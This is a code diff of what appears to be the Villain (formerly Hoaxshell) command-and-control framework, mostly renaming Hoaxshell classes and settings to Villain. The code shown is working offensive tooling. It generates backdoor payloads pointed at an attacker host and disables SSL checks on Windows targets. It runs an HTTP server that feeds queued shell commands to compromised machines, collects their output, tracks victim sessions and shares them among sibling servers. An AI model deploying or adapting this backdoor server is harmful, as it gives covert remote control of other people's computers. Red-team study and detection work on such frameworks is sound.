@@ -14,7 +14,7 @@ from datetime import date, datetime
 from ast import literal_eval
 from random import randint, choice, randrange
 from .common import *
-from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Hoaxshell_settings
+from .settings import Threading_params, Core_server_settings, Sessions_manager_settings, Villain_settings
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -119,12 +119,12 @@ class Payload_generator:
 						
 			else:
 				
-				if (not Hoaxshell_settings.ssl_support) or ('domain' not in arguments):
-					print('Required argument LHOST not provided.') if not Hoaxshell_settings.ssl_support \
+				if (not Villain_settings.ssl_support) or ('domain' not in arguments):
+					print('Required argument LHOST not provided.') if not Villain_settings.ssl_support \
 					else print('Required argument LHOST or DOMAIN not provided.')
 					return
 				
-			frequency = Hoaxshell_settings.default_frequency
+			frequency = Villain_settings.default_frequency
 			
 
 			''' Parse EXEC_OUTFILE '''		
@@ -144,9 +144,9 @@ class Payload_generator:
 			''' Parse DOMAIN '''		
 			if 'domain' in arguments:
 				
-				if not Hoaxshell_settings.ssl_support:
+				if not Villain_settings.ssl_support:
 					domain = False
-					print('Hoaxshell server must be started with SSL support to use a domain.')
+					print('Villain server must be started with SSL support to use a domain.')
 					return
 				
 				if 'domain' in self.supported[args_dict['os']]:
@@ -180,20 +180,20 @@ class Payload_generator:
 			get_cmd = str(uuid4())[0:8]
 			post_res = str(uuid4())[0:8]
 			hid = str(uuid4()).split("-")
-			header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Hoaxshell_settings._header else Hoaxshell_settings._header
+			header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not Villain_settings._header else Villain_settings._header
 			session_unique_id = '-'.join([verify, get_cmd, post_res])
 
 			# Define lhost
 			if not domain:
-				lhost = f'{lhost}:{Hoaxshell_settings.bind_port}' if not Hoaxshell_settings.ssl_support \
-				else f'{lhost}:{Hoaxshell_settings.bind_port_ssl}'
+				lhost = f'{lhost}:{Villain_settings.bind_port}' if not Villain_settings.ssl_support \
+				else f'{lhost}:{Villain_settings.bind_port_ssl}'
 			else:
-				lhost = f'{domain}:{Hoaxshell_settings.bind_port_ssl}'
+				lhost = f'{domain}:{Villain_settings.bind_port_ssl}'
 
 			print(f'Generating backdoor payload...')
 									  
 			# Select base template
-			if Hoaxshell_settings.ssl_support:
+			if Villain_settings.ssl_support:
 				payload = self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload') \
 				if not exec_outfile else self.read_file(f'{cwd}/payload_templates/{os_type}/https_payload_outfile')									  
 			else:
@@ -210,11 +210,11 @@ class Payload_generator:
 			if boolean_args['constraint_mode'] and os_type == 'windows':
 				payload = payload.replace("([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')", "($e+$r)")
 
-			if not domain and Hoaxshell_settings.ssl_support and os_type == 'windows':
+			if not domain and Villain_settings.ssl_support and os_type == 'windows':
 				disable_ssl_chk = self.read_file(f'{cwd}/payload_templates/{os_type}/disable_ssl_check')
 				payload = payload.replace('*DISABLE_SSL_CHK*', disable_ssl_chk)
 			
-			elif domain and Hoaxshell_settings.ssl_support:
+			elif domain and Villain_settings.ssl_support:
 				payload = payload.replace('*DISABLE_SSL_CHK*', '')
 			
 			Sessions_manager.legit_session_ids[session_unique_id] = {
@@ -612,14 +612,14 @@ class Sessions_manager:
 		
 		if session_id in self.active_sessions.keys():
 			if self.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
-				Hoaxshell.dropSession(session_id)
-				sleep(Hoaxshell_settings.default_frequency)
+				Villain.dropSession(session_id)
+				sleep(Villain_settings.default_frequency)
 				self.active_sessions.pop(session_id, None)
 				self.legit_session_ids.pop(session_id, None)
 				session_id_components = session_id.split('-')
-				Hoaxshell.verify.remove(session_id_components[0])
-				Hoaxshell.get_cmd.remove(session_id_components[1])
-				Hoaxshell.post_res.remove(session_id_components[2])
+				Villain.verify.remove(session_id_components[0])
+				Villain.get_cmd.remove(session_id_components[1])
+				Villain.post_res.remove(session_id_components[2])
 				print(f'[{INFO}] Session terminated.')
 				Core_server.announce_session_termination({'session_id' : session_id})
 				
@@ -630,10 +630,10 @@ class Sessions_manager:
 			print('Session invalid.')
 
 
-# -------------- Hoaxshell Server -------------- #
-class Hoaxshell(BaseHTTPRequestHandler):
+# -------------- Villain Server -------------- #
+class Villain(BaseHTTPRequestHandler):
 	
-	header_id = Hoaxshell_settings._header
+	header_id = Villain_settings._header
 	server_unique_id = None
 	command_pool = {}
 	verify = []
@@ -648,7 +648,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	@staticmethod
 	def set_shell_prompt_ready():
-		Hoaxshell.prompt_ready = True
+		Villain.prompt_ready = True
 
 
 
@@ -716,18 +716,18 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			
 		hostname = session_data['Computername']
 		uname = session_data['Username']
-		Hoaxshell.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
-		Hoaxshell.active_shell = session_id	
-		Hoaxshell.prompt_ready = True
+		Villain.hoax_prompt = (hostname + '\\' + uname + '> ') if os_type == 'Windows' else f'{uname}@{hostname}: '
+		Villain.active_shell = session_id	
+		Villain.prompt_ready = True
 		print('\nPress Ctrl + C or type "exit" to deactivate shell.\n')
 		
 		try:
 			
-			while Hoaxshell.active_shell:
+			while Villain.active_shell:
 				
-				if Hoaxshell.prompt_ready:
+				if Villain.prompt_ready:
 				
-					user_input = input(Hoaxshell.hoax_prompt).strip()					
+					user_input = input(Villain.hoax_prompt).strip()					
 					
 					if user_input.lower() in ['clear']:
 						os.system('clear')
@@ -743,16 +743,16 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 					else:
 
-						if Hoaxshell.active_shell:
+						if Villain.active_shell:
 							
-							Hoaxshell.prompt_ready = False
+							Villain.prompt_ready = False
 							
 							if is_remote_shell:
 								command = user_input + ";echo '{" + Core_server.SERVER_UNIQUE_ID + "}'"
 								Core_server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, command)								
 								
 							else:	
-								Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
+								Villain.command_pool[Villain.active_shell].append(user_input)
 
 						else:
 							print(f'\r[{INFO}] No active session.')		
@@ -766,16 +766,16 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		
 		except KeyboardInterrupt:
 			print('\r')
-			Hoaxshell.deactivate_shell()
+			Villain.deactivate_shell()
 		
 
 
 	@staticmethod
 	def deactivate_shell():
 		
-		Hoaxshell.active_shell = None		
-		Hoaxshell.prompt_ready = True
-		Hoaxshell.hoax_prompt = None
+		Villain.active_shell = None		
+		Villain.prompt_ready = True
+		Villain.hoax_prompt = None
 		Main_prompt.main_prompt_ready = True	
 
 
@@ -783,8 +783,8 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	@staticmethod
 	def rst_shell_prompt(prompt = ' > ', prefix = '\r'):
 		
-		Hoaxshell.prompt_ready = True
-		sys.stdout.write(prefix + Hoaxshell.hoax_prompt + global_readline.get_line_buffer())
+		Villain.prompt_ready = True
+		sys.stdout.write(prefix + Villain.hoax_prompt + global_readline.get_line_buffer())
 
 
 
@@ -793,12 +793,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		timestamp = int(datetime.now().timestamp())		
 
 		# Identify session		
-		if not Hoaxshell.header_id:
+		if not Villain.header_id:
 			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
-			Hoaxshell.header_id = f'X-{header_id_extract[0]}'
+			Villain.header_id = f'X-{header_id_extract[0]}'
 
 		try:
-			session_id = self.headers.get(Hoaxshell.header_id)
+			session_id = self.headers.get(Villain.header_id)
 			
 		except:
 			session_id = None
@@ -807,9 +807,9 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		if session_id and (session_id not in Sessions_manager.active_sessions.keys()):
 			if session_id in Sessions_manager.legit_session_ids.keys():
 				h = session_id.split('-')
-				Hoaxshell.verify.append(h[0])
-				Hoaxshell.get_cmd.append(h[1])
-				Hoaxshell.post_res.append(h[2])
+				Villain.verify.append(h[0])
+				Villain.get_cmd.append(h[1])
+				Villain.post_res.append(h[2])
 				Sessions_manager.active_sessions[session_id] = {
 					'IP Address' : self.client_address[0], 
 					'Port' : self.client_address[1],
@@ -818,13 +818,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					'last_received' : timestamp,
 					'OS Type' : Sessions_manager.legit_session_ids[session_id]['OS Type'],
 					'frequency' : Sessions_manager.legit_session_ids[session_id]['frequency'],
-					'Owner' : Hoaxshell.server_unique_id,
+					'Owner' : Villain.server_unique_id,
 					'self_owned' : True,
 					'aliased' : False, 
 					'alias' : None
 				}
 				
-				Hoaxshell.command_pool[session_id] = []
+				Villain.command_pool[session_id] = []
 				
 		elif session_id and (session_id in Sessions_manager.active_sessions.keys()):
 			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp	
@@ -833,19 +833,19 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		elif not session_id:
 			return
 					
-		self.server_version = Hoaxshell_settings.server_version
+		self.server_version = Villain_settings.server_version
 		self.sys_version = ""
-		session_id = self.headers.get(Hoaxshell.header_id)
+		session_id = self.headers.get(Villain.header_id)
 		legit = True if session_id in Sessions_manager.legit_session_ids.keys() else False
 
 
 		# Verify execution	
 		url_split = self.path.strip("/").split("/")
-		if url_split[0] in Hoaxshell.verify and legit:
+		if url_split[0] in Villain.verify and legit:
 			
 			if Sessions_manager.active_sessions[session_id]['execution_verified']:
 				print(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
-				Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+				Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 				return
 			
 			self.send_response(200)
@@ -857,7 +857,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			Sessions_manager.active_sessions[session_id]['Computername'] = url_split[1]
 			Sessions_manager.active_sessions[session_id]['Username'] = url_split[2]
 			print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{self.client_address[0]}{END}')
-			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+			Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 
 			try:				
 				Thread(target = self.monitor_shell_state, args = (session_id,), daemon = True).start()			
@@ -874,15 +874,15 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			
 
 		# Grab cmd
-		elif self.path.strip("/") in Hoaxshell.get_cmd and legit:
+		elif self.path.strip("/") in Villain.get_cmd and legit:
 
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
 			self.send_header('Access-Control-Allow-Origin', '*')
 			self.end_headers()
 			
-			if len(Hoaxshell.command_pool[session_id]):
-				cmd = Hoaxshell.command_pool[session_id].pop(0)
+			if len(Villain.command_pool[session_id]):
+				cmd = Villain.command_pool[session_id].pop(0)
 				self.wfile.write(bytes(cmd, 'utf-8'))
 
 			else:
@@ -909,7 +909,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		if legit:		
 				
 			Sessions_manager.active_sessions[session_id]['last_received'] = timestamp
-			self.server_version = Hoaxshell_settings.server_version
+			self.server_version = Villain_settings.server_version
 			self.sys_version = ""				
 
 			# cmd output
@@ -923,12 +923,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					self.wfile.write(b'OK')
 					content_len = int(self.headers.get('Content-Length'))
 					output = self.rfile.read(content_len)
-					#output = Hoaxshell.cmd_output_interpreter(self, output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
+					#output = Villain.cmd_output_interpreter(self, output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
 					output = self.cmd_output_interpreter(output, constraint_mode = Sessions_manager.legit_session_ids[session_id]['constraint_mode'])
 					
 					if isinstance(output, str):	
 						print(f'\r{GREEN}{output}{END}')
-						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
+						Main_prompt.set_main_prompt_ready() if not self.active_shell else Villain.set_shell_prompt_ready()
 					
 					elif isinstance(output, list):
 						Core_server.send_receive_one_encrypted(output[0], output[1], 'command_output', 30)
@@ -940,7 +940,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					
 					if isinstance(output, str):
 						print(error_msg)
-						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
+						Main_prompt.set_main_prompt_ready() if not self.active_shell else Villain.set_shell_prompt_ready()
 						
 					elif isinstance(output, list):
 						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
@@ -960,13 +960,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 	def do_OPTIONS(self):
 
-		self.server_version = Hoaxshell_settings.server_version
+		self.server_version = Villain_settings.server_version
 		self.sys_version = ""
 		self.send_response(200)
 		self.send_header('Access-Control-Allow-Origin', self.headers["Origin"])
 		self.send_header('Vary', "Origin")
 		self.send_header('Access-Control-Allow-Credentials', 'true')
-		self.send_header('Access-Control-Allow-Headers', Hoaxshell_settings.header_id)
+		self.send_header('Access-Control-Allow-Headers', Villain_settings.header_id)
 		self.end_headers()
 		self.wfile.write(b'OK')
 
@@ -983,10 +983,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		exit_command = 'stop-process $PID' if os_type  == 'Windows' else 'echo byee'
 		
 		if (os_type == 'Windows' and not outfile) or os_type == 'Linux':
-			Hoaxshell.command_pool[session_id].append(exit_command)
+			Villain.command_pool[session_id].append(exit_command)
 			
 		elif os_type == 'Windows' and outfile:
-			Hoaxshell.command_pool[session_id].append(f'quit')
+			Villain.command_pool[session_id].append(f'quit')
 		
 
 
@@ -1004,13 +1004,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				
 				try:					
 					if Sessions_manager.active_sessions[session_id]['Owner'] == Core_server.SERVER_UNIQUE_ID:
-						Hoaxshell.dropSession(session_id)				
+						Villain.dropSession(session_id)				
 						#Core_server.announce_session_termination({'session_id' : session_id})
 						
 				except:
 					continue
 			
-			sleep(Hoaxshell_settings.default_frequency + 2.0)
+			sleep(Villain_settings.default_frequency + 2.0)
 			print(f'\r[{INFO}] Sessions terminated.')
 			
 		else:
@@ -1025,7 +1025,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		while session_id in Sessions_manager.active_sessions.keys():
 
 			timestamp = int(datetime.now().timestamp())
-			tlimit = (Hoaxshell_settings.default_frequency + Sessions_manager_settings.shell_state_change_after)
+			tlimit = (Villain_settings.default_frequency + Sessions_manager_settings.shell_state_change_after)
 			last_received = Sessions_manager.active_sessions[session_id]['last_received']
 			time_difference = abs(last_received - timestamp)
 			current_status = Sessions_manager.active_sessions[session_id]['Status']
@@ -1050,39 +1050,39 @@ def initiate_hoax_server():
 	try:
 
 		# Check if both cert and key files were provided
-		if (Hoaxshell_settings.certfile and not Hoaxshell_settings.keyfile) or (Hoaxshell_settings.keyfile and not Hoaxshell_settings.certfile):
+		if (Villain_settings.certfile and not Villain_settings.keyfile) or (Villain_settings.keyfile and not Villain_settings.certfile):
 			exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')
 
 		# Start http server
-		port = Hoaxshell_settings.bind_port if not Hoaxshell_settings.ssl_support else Hoaxshell_settings.bind_port_ssl
+		port = Villain_settings.bind_port if not Villain_settings.ssl_support else Villain_settings.bind_port_ssl
 		
 		try:
-			httpd = HTTPServer((Hoaxshell_settings.bind_address, port), Hoaxshell)
+			httpd = HTTPServer((Villain_settings.bind_address, port), Villain)
 
 		except OSError:
-			exit(f'[{DEBUG}] Hoaxshell HTTP server failed to start. Port {port} seems to already be in use.\n')
+			exit(f'[{DEBUG}] Villain HTTP server failed to start. Port {port} seems to already be in use.\n')
 		
 		except:
-			exit(f'\n[{DEBUG}] Hoaxshell HTTP server failed to start (Unknown error occurred).\n')
+			exit(f'\n[{DEBUG}] Villain HTTP server failed to start (Unknown error occurred).\n')
 
-		if Hoaxshell_settings.ssl_support:
+		if Villain_settings.ssl_support:
 			httpd.socket = ssl.wrap_socket (
 				httpd.socket,
-				keyfile = Hoaxshell_settings.keyfile,
-				certfile = Hoaxshell_settings.certfile,
+				keyfile = Villain_settings.keyfile,
+				certfile = Villain_settings.certfile,
 				server_side = True,
 				ssl_version=ssl.PROTOCOL_TLS
 			)
 
 
-		Hoaxshell_server = Thread(target = httpd.serve_forever, args = ())
-		Hoaxshell_server.daemon = True
-		Hoaxshell_server.start()
-		print(f'[{INFO}] Hoaxshell engine listening on {ORANGE}{Hoaxshell_settings.bind_address}{END}:{ORANGE}{port}{END}\n')
+		Villain_server = Thread(target = httpd.serve_forever, args = ())
+		Villain_server.daemon = True
+		Villain_server.start()
+		print(f'[{INFO}] Villain engine listening on {ORANGE}{Villain_settings.bind_address}{END}:{ORANGE}{port}{END}\n')
 
 	
 	except KeyboardInterrupt:
-		Hoaxshell.terminate()
+		Villain.terminate()
 
 
 
@@ -1131,7 +1131,7 @@ class Core_server:
 					self.requests[request_id] = False
 					print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
 					print(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to connect. You have 10 seconds.")
-					Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+					Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 					
 					timeout_start = time()
 
@@ -1147,7 +1147,7 @@ class Core_server:
 						Core_server.send_msg(conn, self.CONNECT_DENY)
 						conn.close()						
 						print(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
-						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+						Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 					
 					del self.requests[request_id]
 								
@@ -1222,7 +1222,7 @@ class Core_server:
 
 						# Check if session exists
 						if data['session_id'] in Sessions_manager.active_sessions.keys():																			
-							Hoaxshell.command_pool[data['session_id']].append(data['command'])
+							Villain.command_pool[data['session_id']].append(data['command'])
 							Core_server.send_msg(conn, self.response_ack(sibling_id))
 							
 							
@@ -1232,8 +1232,8 @@ class Core_server:
 						print(f'\r{GREEN}{decrypted_data[1]}{END}')
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 						
-						if Hoaxshell.active_shell:
-							Hoaxshell.prompt_ready = True
+						if Villain.active_shell:
+							Villain.prompt_ready = True
 
 
 
@@ -1243,7 +1243,7 @@ class Core_server:
 						decrypted_data[1].pop('session_id', None)
 						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
 						print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
-						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+						Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 						del decrypted_data, new_session_id						
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -1257,10 +1257,10 @@ class Core_server:
 						status = f'{GREEN}Active{END}' if decrypted_data[1]['Status'] == 'Active' else f'{ORANGE}Undefined{END}'
 						print(f'\r[{INFO}] Backdoor session {ORANGE}{session_id}{END} status changed to {status}.')
 
-						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
-							Hoaxshell.deactivate_shell()
+						if Villain.active_shell == decrypted_data[1]['session_id']:
+							Villain.deactivate_shell()
 
-						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+						Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 						del session_id, status
 						
 
@@ -1272,11 +1272,11 @@ class Core_server:
 						Sessions_manager.active_sessions.pop(decrypted_data[1]['session_id'], None)					
 						print(f'\r[{INFO}] Backdoor session on {ORANGE}{victim_ip}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}) terminated.')
 						
-						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
-							Hoaxshell.deactivate_shell()
+						if Villain.active_shell == decrypted_data[1]['session_id']:
+							Villain.deactivate_shell()
 						
 						del victim_ip	
-						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()				
+						Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()				
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 
 
@@ -1306,7 +1306,7 @@ class Core_server:
 																
 						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
 						print(f'\r[{WARN}] {lost_sessions} x backdoor sessions lost.') if lost_sessions else chill()
-						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+						Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 						del server_ip, hostname, active_sessions_clone, active_sessions
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 										
@@ -1331,8 +1331,8 @@ class Core_server:
 		conn.close()
 		
 		if rst_prompt:			
-			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell \
-			else Hoaxshell.set_shell_prompt_ready()
+			Main_prompt.set_main_prompt_ready() if not Villain.active_shell \
+			else Villain.set_shell_prompt_ready()
 		
 		del raw_data, str_data			
 		Threading_params.thread_limiter.release()
@@ -1561,7 +1561,7 @@ class Core_server:
 		
 		if additional_siblings:
 			print(f'\r[{INFO}] {additional_siblings} x additional sibling server connections established!')
-			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+			Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 
 
 
@@ -1572,7 +1572,7 @@ class Core_server:
 		
 		if isinstance(shells_data, dict):
 			for session_id in shells_data.keys():
-				if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Hoaxshell.server_unique_id:
+				if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Villain.server_unique_id:
 					shells_data[session_id]['alias'] = None
 					shells_data[session_id]['aliased'] = False
 					shells_data[session_id]['self_owned'] = False
@@ -1581,7 +1581,7 @@ class Core_server:
 		
 		if additional_shells:
 			print(f'\r[{INFO}] {additional_shells} x additional shell sessions established!')		
-			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()			
+			Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()			
 
 
 
@@ -1657,7 +1657,7 @@ class Core_server:
 		if initiator:
 			Main_prompt.set_main_prompt_ready()			
 		else:
-			Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+			Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 
 
 
@@ -1766,7 +1766,7 @@ class Core_server:
 							server_ip = self.sibling_servers[sibling_id]["Server IP"]
 							del self.sibling_servers[sibling_id]
 							print(f'\r[{WARN}] Connection with sibling server {ORANGE}{server_ip}{END} lost.')
-							Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
+							Main_prompt.rst_prompt() if not Villain.active_shell else Villain.rst_shell_prompt()
 												
 					except:					
 						continue
